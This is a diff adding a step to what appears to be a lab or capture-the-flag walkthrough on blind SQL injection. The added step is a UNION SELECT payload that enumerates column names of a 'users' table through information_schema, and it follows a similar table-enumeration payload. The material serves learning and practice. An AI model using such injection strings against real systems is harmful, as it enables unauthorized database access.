@@ -97,3 +97,6 @@ Now we need to enumerate `table names` using a similar method.
     admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
 ![full table name](images/22-full-table-name.png)<br/>
 After many tryed i've found full table name, which is `users`<br/>
+
+    admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME !='%username%'; ---
+![column name](images/23-column-name-found.png)<br/>
